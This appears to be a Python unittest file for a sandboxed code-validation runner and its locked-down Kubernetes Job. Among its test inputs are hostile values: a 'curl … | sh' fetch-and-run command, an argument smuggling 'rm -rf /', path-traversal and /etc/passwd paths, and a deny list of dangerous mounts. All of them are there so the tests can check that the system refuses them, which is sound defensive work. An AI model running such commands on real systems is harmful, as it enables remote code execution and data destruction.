"""AF-011 checks: the restricted Job, and the runner inside it.

Standard library only. A `FakeKube` stands in for the API, so the Job object,
the polling, the cancellation path and every error path are exercised without
a cluster; the runner itself is run for real against temporary directories,
because its whole job is to copy, verify and execute.

The Job manifest assertions are deliberately blunt and individually named. A
restriction that quietly disappears from `jobspec.build_job` should break one
obviously-named check rather than being absorbed by a broad structural test.
"""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
import uuid
from pathlib import Path

from backend.contracts import v1
from backend.worker import jobspec, kube, packages, validate


def envelope(*, attempt_id=None, workspace_id=None, relationship_id=None,
             resources=(), capabilities=("code.validate",),
             validators=("patch.applies", "sandbox.exit_zero")) -> v1.JobEnvelope:
    node = str(uuid.uuid4())
    return v1.JobEnvelope(
        contract_version="1.0",
        workspace_id=workspace_id or str(uuid.uuid4()),
        workflow_id=str(uuid.uuid4()), job_id=str(uuid.uuid4()),
        step_id=str(uuid.uuid4()),
        attempt_id=attempt_id or str(uuid.uuid4()),
        chat_id=str(uuid.uuid4()), coordinator_node_id=str(uuid.uuid4()),
        target_node_id=node,
        relationship_id=relationship_id or str(uuid.uuid4()),
        original_request="validate the reviewed change", task_type="code",
        required_capabilities=list(capabilities),
        context=[v1.ResourceRef(**item) for item in resources],
        attachments=[], allowed_tools=[],
        limits=v1.Limits(cpu_millis=1000, memory_bytes=536_870_912,
                         runtime_seconds=120, processes=8,
                         workspace_bytes=67_108_864, output_bytes=65_536,
                         tool_network="disabled"),
        output=v1.OutputContract(kind="patch", validators=list(validators),
                                 schema_ref=None),
        approval_policy="coordinator-default-v1",
        created_at="2026-09-05T10:00:00Z", deadline_at="2026-09-05T10:10:00Z",
        cancel_requested=False)


IMAGE = "docker.io/library/aegisforge-worker@sha256:" + "a" * 64


# --------------------------------------------------------------------------
# The Job object
# --------------------------------------------------------------------------

class TestJobManifest(unittest.TestCase):
    def setUp(self):
        self.envelope = envelope()
        self.job = jobspec.build_job(
            self.envelope, image=IMAGE,
            subpath=f"packages/x/y/{self.envelope.attempt_id}",
            runtime_seconds=120)
        self.pod = self.job["spec"]["template"]["spec"]
        self.container = self.pod["containers"][0]

    def test_the_name_comes_from_a_validated_uuid_only(self):
        name = self.job["metadata"]["name"]
        self.assertEqual(name,
                         "af-validate-" + self.envelope.attempt_id.replace("-", ""))
        self.assertLessEqual(len(name), 63)
        self.assertRegex(name, r"^[a-z0-9-]+$")

    def test_a_non_uuid_attempt_cannot_name_a_job(self):
        for bad in ("../../etc", "Robert'); DROP TABLE--", "", "a" * 90):
            with self.subTest(value=bad):
                with self.assertRaises(jobspec.ValidationUnavailable):
                    jobspec.job_name(bad)

    def test_no_service_account_token_is_mounted(self):
        """The Job must not be able to reach the Kubernetes API at all."""
        self.assertIs(self.pod["automountServiceAccountToken"], False)
        mounts = json.dumps(self.container["volumeMounts"])
        self.assertNotIn("serviceaccount", mounts.lower())

    def test_it_runs_as_a_non_root_user_with_no_capabilities(self):
        self.assertIs(self.pod["securityContext"]["runAsNonRoot"], True)
        self.assertEqual(self.pod["securityContext"]["runAsUser"], 10001)
        self.assertEqual(self.container["securityContext"]["capabilities"]["drop"],
                         ["ALL"])

    def test_privilege_escalation_is_disabled(self):
        self.assertIs(self.container["securityContext"]["allowPrivilegeEscalation"],
                      False)
        self.assertIs(self.container["securityContext"]["privileged"], False)

    def test_the_root_filesystem_is_read_only(self):
        self.assertIs(self.container["securityContext"]["readOnlyRootFilesystem"],
                      True)

    def test_the_seccomp_profile_is_runtime_default(self):
        self.assertEqual(self.pod["securityContext"]["seccompProfile"]["type"],
                         "RuntimeDefault")

    def test_the_package_is_mounted_read_only_at_its_own_subpath(self):
        mount = next(item for item in self.container["volumeMounts"]
                     if item["name"] == "package")
        self.assertIs(mount["readOnly"], True)
        self.assertIn(self.envelope.attempt_id, mount["subPath"])
        volume = next(item for item in self.pod["volumes"]
                      if item["name"] == "package")
        self.assertIs(volume["persistentVolumeClaim"]["readOnly"], True)

    def test_the_workspace_is_a_size_limited_emptydir(self):
        volume = next(item for item in self.pod["volumes"]
                      if item["name"] == "workspace")
        self.assertIn("sizeLimit", volume["emptyDir"])

    def test_nothing_dangerous_is_mounted(self):
        """No host path, Docker socket, credential, pairing state or Redis."""
        rendered = json.dumps(self.job).lower()
        for forbidden in ("hostpath", "docker.sock", "containerd.sock",
                          "secretkeyref", "/var/run/docker", "pairing",
                          "redis", "worker-credential", "hostnetwork",
                          "hostpid", "hostipc"):
            with self.subTest(value=forbidden):
                self.assertNotIn(forbidden, rendered)
        self.assertEqual({item["name"] for item in self.pod["volumes"]},
                         {"package", "workspace"})

    def test_cpu_memory_deadline_and_ttl_are_all_present(self):
        limits = self.container["resources"]["limits"]
        self.assertIn("cpu", limits)
        self.assertIn("memory", limits)
        self.assertGreater(self.job["spec"]["activeDeadlineSeconds"], 0)
        self.assertGreater(self.job["spec"]["ttlSecondsAfterFinished"], 0)
        self.assertEqual(self.job["spec"]["backoffLimit"], 0)

    def test_the_deadline_is_capped_regardless_of_what_is_requested(self):
        job = jobspec.build_job(self.envelope, image=IMAGE, subpath="p",
                                runtime_seconds=999_999)
        self.assertLessEqual(job["spec"]["activeDeadlineSeconds"],
                             jobspec.MAX_RUNTIME_SECONDS)

    def test_the_command_is_argv_and_names_the_runner_only(self):
        self.assertEqual(self.container["command"],
                         ["python", "-m", "backend.worker.validate",
                          "/package", "/workspace"])

    def test_a_missing_image_digest_refuses_rather_than_floating(self):
        with self.assertRaises(jobspec.ValidationUnavailable):
            jobspec.build_job(self.envelope, image="", subpath="p",
                              runtime_seconds=60)


# --------------------------------------------------------------------------
# The runner
# --------------------------------------------------------------------------

class TestRunner(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory()
        self.addCleanup(self.tmp.cleanup)
        self.package = Path(self.tmp.name) / "package"
        self.workspace = Path(self.tmp.name) / "workspace"

    def build(self, *, original: dict, replacement: dict, plan: dict):
        import hashlib
        files = self.package / "files"
        for path, text in original.items():
            target = files / validate.ORIGINAL_DIR / path
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text)
        for path, text in replacement.items():
            target = files / validate.REPLACEMENT_DIR / path
            target.parent.mkdir(parents=True, exist_ok=True)
            target.write_text(text)
        entries = []
        for path in replacement:
            entries.append({
                "path": path,
                "base_sha256": hashlib.sha256(
                    original[path].encode()).hexdigest(),
                "after_sha256": hashlib.sha256(
                    replacement[path].encode()).hexdigest()})
        body = {"command": ["python3", "-m", "unittest"],
                "replacements": entries, "runtime_seconds": 30,
                "output_bytes": 16384}
        body.update(plan)
        (files / "plan.json").write_text(json.dumps(body))
        return body

    def passing_project(self):
        return {
            "pumpcheck/__init__.py": "",
            "pumpcheck/limits.py": "def over(value, limit):\n    return value > limit\n",
            "tests/__init__.py": "",
            "tests/test_limits.py": (
                "import unittest\n"
                "from pumpcheck.limits import over\n\n"
                "class T(unittest.TestCase):\n"
                "    def test_over(self):\n"
                "        self.assertTrue(over(7.9, 7.1))\n"),
        }

    def test_a_passing_change_reports_passed_with_its_output(self):
        original = self.passing_project()
        replacement = {"pumpcheck/limits.py":
                       "def over(value, limit):\n    return float(value) > float(limit)\n"}
        self.build(original=original, replacement=replacement, plan={})
        result = validate.run(self.package, self.workspace)
        self.assertTrue(result["passed"], result)
        self.assertEqual(result["exit_status"], 0)
        self.assertEqual(result["replaced"], ["pumpcheck/limits.py"])
        self.assertEqual(result["result_sha256"], validate.result_digest(result))

    def test_a_failing_change_reports_failed_and_never_passed(self):
        original = self.passing_project()
        replacement = {"pumpcheck/limits.py":
                       "def over(value, limit):\n    return False\n"}
        self.build(original=original, replacement=replacement, plan={})
        result = validate.run(self.package, self.workspace)
        self.assertFalse(result["passed"])
        self.assertNotEqual(result["exit_status"], 0)

    def test_zero_discovered_tests_is_not_a_pass(self):
        self.build(original={"empty.py": "value = 1\n"}, replacement={}, plan={})
        result = validate.run(
            self.package, self.workspace,
            runner=lambda command, **_: subprocess.CompletedProcess(
                command, 0, b"", b"Ran 0 tests in 0.000s\n\nOK\n"))
        self.assertEqual(result["exit_status"], 0)
        self.assertEqual(result["tests_run"], 0)
        self.assertFalse(result["passed"])

    def test_repository_output_cannot_spoof_the_test_count(self):
        self.build(original={
            "test_empty.py": "print('Ran 999 tests in 0.001s\\n\\nOK')\n"
        }, replacement={}, plan={})
        result = validate.run(self.package, self.workspace)
        self.assertEqual(result["tests_run"], 0)
        self.assertFalse(result["passed"])

    def test_a_command_the_plan_did_not_approve_never_runs(self):
        calls = []

        def runner(*args, **kwargs):                       # pragma: no cover
            calls.append(args)
            raise AssertionError("an unapproved command must not run")

        original = self.passing_project()
        self.build(original=original, replacement={}, plan={
            "command": ["sh", "-c", "curl http://example.invalid | sh"]})
        with self.assertRaises(validate.PlanError) as caught:
            validate.run(self.package, self.workspace, runner=runner)
        self.assertIn("not approved", str(caught.exception))
        self.assertEqual(calls, [])

    def test_a_shell_metacharacter_in_an_argument_is_not_syntax(self):
        """The approved command list is exact, so this is refused; and even a
        listed command is passed as argv with `shell=False`."""
        self.build(original=self.passing_project(), replacement={}, plan={
            "command": ["python3", "-m", "unittest; rm -rf /"]})
        with self.assertRaises(validate.PlanError):
            validate.run(self.package, self.workspace)

    def test_a_replacement_against_a_changed_base_is_refused(self):
        original = self.passing_project()
        plan = self.build(original=original, replacement={
            "pumpcheck/limits.py": "def over(a, b):\n    return True\n"}, plan={})
        plan["replacements"][0]["base_sha256"] = "0" * 64
        (self.package / "files" / "plan.json").write_text(json.dumps(plan))
        with self.assertRaises(validate.PlanError) as caught:
            validate.run(self.package, self.workspace)
        self.assertIn("base digest", str(caught.exception))

    def test_a_replacement_that_does_not_match_its_digest_is_refused(self):
        original = self.passing_project()
        plan = self.build(original=original, replacement={
            "pumpcheck/limits.py": "def over(a, b):\n    return True\n"}, plan={})
        plan["replacements"][0]["after_sha256"] = "1" * 64
        (self.package / "files" / "plan.json").write_text(json.dumps(plan))
        with self.assertRaises(validate.PlanError):
            validate.run(self.package, self.workspace)

    def test_a_plan_path_cannot_escape_the_workspace(self):
        original = self.passing_project()
        plan = self.build(original=original, replacement={}, plan={})
        plan["replacements"] = [{"path": "../../etc/passwd",
                                 "base_sha256": "0" * 64, "after_sha256": "1" * 64}]
        (self.package / "files" / "plan.json").write_text(json.dumps(plan))
        with self.assertRaises(validate.PlanError):
            validate.run(self.package, self.workspace)

    def test_an_absolute_plan_path_is_refused(self):
        original = self.passing_project()
        plan = self.build(original=original, replacement={}, plan={})
        plan["replacements"] = [{"path": "/etc/passwd", "base_sha256": "0" * 64,
                                 "after_sha256": "1" * 64}]
        (self.package / "files" / "plan.json").write_text(json.dumps(plan))
        with self.assertRaises(validate.PlanError):
            validate.run(self.package, self.workspace)

    def test_a_symlink_in_the_package_stops_preparation(self):
        original = self.passing_project()
        self.build(original=original, replacement={}, plan={})
        link = self.package / "files" / validate.ORIGINAL_DIR / "escape.py"
        os.symlink("/etc/passwd", link)
        with self.assertRaises(validate.PlanError) as caught:
            validate.run(self.package, self.workspace)
        self.assertIn("symbolic link", str(caught.exception))

    def test_output_is_capped_and_the_truncation_is_recorded(self):
        original = {
            "tests/__init__.py": "",
            "tests/test_loud.py": (
                "import unittest, sys\n\n"
                "class T(unittest.TestCase):\n"
                "    def test_loud(self):\n"
                "        sys.stdout.write('x' * 200000)\n"),
        }
        self.build(original=original, replacement={}, plan={"output_bytes": 4096})
        result = validate.run(self.package, self.workspace)
        self.assertLessEqual(len(result["stdout"]), 4096)
        self.assertTrue(result["stdout_truncated"])

    def test_a_command_that_never_ends_is_stopped_and_is_not_a_pass(self):
        original = {
            "tests/__init__.py": "",
            "tests/test_slow.py": (
                "import unittest, time\n\n"
                "class T(unittest.TestCase):\n"
                "    def test_slow(self):\n"
                "        time.sleep(30)\n"),
        }
        self.build(original=original, replacement={},
                   plan={"runtime_seconds": 2})
        result = validate.run(self.package, self.workspace)
        self.assertTrue(result["timed_out"])
        self.assertFalse(result["passed"])

    def test_the_canonical_package_is_never_modified(self):
        original = self.passing_project()
        replacement = {"pumpcheck/limits.py":
                       "def over(value, limit):\n    return float(value) > float(limit)\n"}
        self.build(original=original, replacement=replacement, plan={})
        source = self.package / "files" / validate.ORIGINAL_DIR
        before = {str(path.relative_to(source)): path.read_bytes()
                  for path in source.rglob("*") if path.is_file()}
        validate.run(self.package, self.workspace)
        after = {str(path.relative_to(source)): path.read_bytes()
                 for path in source.rglob("*") if path.is_file()}
        self.assertEqual(before, after)

    def test_the_child_environment_carries_no_inherited_credential(self):
        seen = {}

        def runner(command, **kwargs):
            seen.update(kwargs)
            return subprocess.CompletedProcess(command, 0, b"ok", b"")

        os.environ["AEGIS_REDIS_PASSWORD"] = "must-not-propagate"
        self.addCleanup(os.environ.pop, "AEGIS_REDIS_PASSWORD", None)
        self.build(original=self.passing_project(), replacement={}, plan={})
        validate.run(self.package, self.workspace, runner=runner)
        self.assertNotIn("AEGIS_REDIS_PASSWORD", seen["env"])
        self.assertEqual(set(seen["env"]),
                         {"PATH", "HOME", "PYTHONDONTWRITEBYTECODE",
                          "PYTHONHASHSEED", "LC_ALL", "LANG"})
        self.assertIs(seen["shell"], False)
        self.assertEqual(seen["cwd"], str(self.workspace))

    def test_the_result_digest_detects_an_edited_result(self):
        """A failed run edited into a pass no longer matches its own digest."""
        original = self.passing_project()
        replacement = {"pumpcheck/limits.py":
                       "def over(value, limit):\n    return False\n"}
        self.build(original=original, replacement=replacement, plan={})
        result = validate.run(self.package, self.workspace)
        self.assertFalse(result["passed"])
        self.assertEqual(validate.result_digest(result), result["result_sha256"])
        tampered = {**result, "passed": True, "exit_status": 0}
        self.assertNotEqual(validate.result_digest(tampered),
                            tampered["result_sha256"])


# --------------------------------------------------------------------------
# Driving a Job through a fake API
# --------------------------------------------------------------------------

class FakeKube:
    def __init__(self, *, states, pod=None, logs="", fail_on=None):
        self.states = list(states)
        self._pod = pod
        self.logs = logs
        self.fail_on = fail_on or set()
        self.created: list[dict] = []
        self.deleted: list[str] = []

    def create_job(self, manifest):
        if "create" in self.fail_on:
            raise kube.KubeError("refused", 403)
        self.created.append(manifest)
        return {"metadata": {"uid": "job-uid-1"}}

    def get_job(self, name):
        if "get" in self.fail_on:
            raise kube.KubeUnavailable("api down")
        if len(self.states) > 1:
            return self.states.pop(0)
        # The last scripted state repeats. Defaulting to "succeeded" here would
        # make the deadline check pass for the wrong reason.
        return self.states[0] if self.states else {"status": {}}

    def wait_for_completion(self, name, *, deadline_seconds, should_cancel=None,
                            poll_seconds=0.0):
        return kube.Kube.wait_for_completion(
            self, name, deadline_seconds=deadline_seconds,
            poll_seconds=0.0, should_cancel=should_cancel)

    def find_pod(self, *, label, value):
        return self._pod

    def pod_logs(self, name, *, container="validate", limit_bytes=None):
        return self.logs

    def delete_job(self, name):
        self.deleted.append(name)
        return {}


def result_line(**overrides) -> str:
    result = {"result_version": validate.RESULT_VERSION, "command":
              ["python3", "-m", "unittest"], "exit_status": 0,
              "timed_out": False, "stdout": "OK", "stderr": "",
              "stdout_truncated": False, "stderr_truncated": False,
              "replaced": ["a.py"], "started_at": "2026-09-05T10:00:00Z",
              "finished_at": "2026-09-05T10:00:05Z", "runtime_ms": 5000,
              "tests_run": 1, "passed": True}
    result.update(overrides)
    result["result_sha256"] = validate.result_digest(result)
    return json.dumps(result, sort_keys=True)


POD = {"metadata": {"namespace": "aegisforge", "name": "af-validate-x-abcde",
                    "uid": "pod-uid-9"},
       "status": {"phase": "Succeeded", "containerStatuses": [
           {"name": "validate", "ready": False, "restartCount": 0,
            "imageID": "docker.io/library/aegisforge-worker@sha256:" + "b" * 64}]}}


class _Store:
    def __init__(self, manifest=None):
        self._manifest = manifest

    def manifest(self, **_kwargs):
        return self._manifest


class TestJobValidator(unittest.TestCase):
    def setUp(self):
        self.envelope = envelope()
        self.store = _Store({"package_sha256": "c" * 64})

    def validator(self, client):
        return jobspec.JobValidator(client=client, image=IMAGE)

    def test_a_successful_job_reports_the_runners_own_result(self):
        client = FakeKube(states=[{"status": {"succeeded": 1}}], pod=POD,
                          logs="noise\n" + result_line())
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5)
        self.assertTrue(result["observed"])
        self.assertTrue(result["passed"])
        self.assertEqual(result["job_uid"], "job-uid-1")
        self.assertEqual(result["pod"]["pod_uid"], "pod-uid-9")
        self.assertEqual(result["pod"]["image_digest"], "b" * 64)

    def test_a_job_that_succeeded_with_no_readable_result_is_not_a_pass(self):
        """Job phase is not the verdict; the runner's own line is."""
        client = FakeKube(states=[{"status": {"succeeded": 1}}], pod=POD,
                          logs="the pod said nothing useful")
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5)
        self.assertFalse(result["observed"])
        self.assertFalse(result["passed"])

    def test_a_result_whose_digest_does_not_match_is_discarded(self):
        forged = json.loads(result_line())
        forged["passed"] = True
        forged["exit_status"] = 1          # digest no longer matches
        client = FakeKube(states=[{"status": {"succeeded": 1}}], pod=POD,
                          logs=json.dumps(forged))
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5)
        self.assertFalse(result["observed"])
        self.assertFalse(result["passed"])

    def test_a_failing_job_is_observed_and_reported_as_failed(self):
        client = FakeKube(states=[{"status": {"failed": 1}}], pod=POD,
                          logs=result_line(passed=False, exit_status=1))
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5)
        self.assertTrue(result["observed"])
        self.assertFalse(result["passed"])

    def test_a_failing_job_cannot_be_overridden_by_a_passing_log(self):
        client = FakeKube(states=[{"status": {"failed": 1}}], pod=POD,
                          logs=result_line())
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5)
        self.assertTrue(result["observed"])
        self.assertFalse(result["passed"])

    def test_an_api_error_deletes_the_job_and_never_passes(self):
        client = FakeKube(states=[], fail_on={"get"})
        with self.assertRaises(kube.KubeError):
            self.validator(client).run(self.envelope, package_root=self.store,
                                       deadline_seconds=5)
        self.assertEqual(client.deleted, [jobspec.job_name(self.envelope.attempt_id)])

    def test_cancellation_deletes_only_the_named_job(self):
        client = FakeKube(states=[{"status": {}}], pod=POD)
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=5,
            should_cancel=lambda: True)
        self.assertTrue(result["cancelled"])
        self.assertFalse(result.get("passed"))
        self.assertEqual(client.deleted, [jobspec.job_name(self.envelope.attempt_id)])

    def test_a_deadline_deletes_the_job_and_is_not_a_pass(self):
        client = FakeKube(states=[{"status": {}}] * 4, pod=POD)
        result = self.validator(client).run(
            self.envelope, package_root=self.store, deadline_seconds=0.01)
        self.assertFalse(result["observed"])
        self.assertNotIn("passed", result)
        self.assertEqual(client.deleted, [jobspec.job_name(self.envelope.attempt_id)])

    def test_an_attempt_with_no_package_cannot_be_validated(self):
        client = FakeKube(states=[{"status": {"succeeded": 1}}], pod=POD)
        with self.assertRaises(jobspec.ValidationUnavailable):
            self.validator(client).run(self.envelope, package_root=_Store(None),
                                       deadline_seconds=5)
        self.assertEqual(client.created, [])

    def test_the_subpath_is_derived_from_validated_identifiers(self):
        path = self.validator(FakeKube(states=[])).subpath(self.envelope)
        self.assertTrue(path.endswith(self.envelope.attempt_id))
        self.assertNotIn("..", path)

    def test_no_pod_evidence_is_produced_when_no_pod_was_returned(self):
        self.assertIsNone(kube.Kube.pod_evidence(None))

    def test_pod_evidence_omits_a_digest_the_api_did_not_report(self):
        """Requesting an image is not evidence that the image ran."""
        pod = {"metadata": {"name": "p", "uid": "u", "namespace": "n"},
               "status": {"phase": "Pending", "containerStatuses": []}}
        evidence = kube.Kube.pod_evidence(pod)
        self.assertIsNone(evidence["image_digest"])
        self.assertFalse(evidence["ready"])


class TestKubeClientSafety(unittest.TestCase):
    def test_a_missing_token_or_ca_refuses_to_construct_a_client(self):
        with tempfile.TemporaryDirectory() as tmp:
            with self.assertRaises(kube.KubeUnavailable):
                kube.Kube(root=tmp)
            Path(tmp, "token").write_text("t")
            with self.assertRaises(kube.KubeUnavailable):
                kube.Kube(root=tmp)
            self.assertFalse(kube.Kube.available(tmp))

    def test_the_client_never_disables_certificate_verification(self):
        source = Path("backend/worker/kube.py").read_text()
        for forbidden in ("CERT_NONE", "check_hostname = False",
                          "_create_unverified_context", "verify=False"):
            with self.subTest(value=forbidden):
                self.assertNotIn(forbidden, source)

    def test_no_kubernetes_sdk_is_imported(self):
        source = Path("backend/worker/kube.py").read_text()
        self.assertNotIn("import kubernetes", source)


if __name__ == "__main__":                                    # pragma: no cover
    unittest.main()
